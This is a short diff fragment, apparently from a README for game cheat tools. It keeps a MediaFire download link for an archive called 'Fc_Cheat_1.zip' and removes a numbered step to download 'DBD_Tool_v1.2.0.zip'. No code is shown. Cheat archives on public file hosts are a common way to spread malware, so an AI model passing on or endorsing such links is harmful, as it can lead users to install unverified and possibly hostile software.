@@ -31,6 +31,3 @@ Download- https://www.mediafire.com/file/m8qga4qo9cv4cmt/Fc_Cheat_1.zip/file
 
 
 
-1. **Download the latest release**
-   ```bash
-   DBD_Tool_v1.2.0.zip
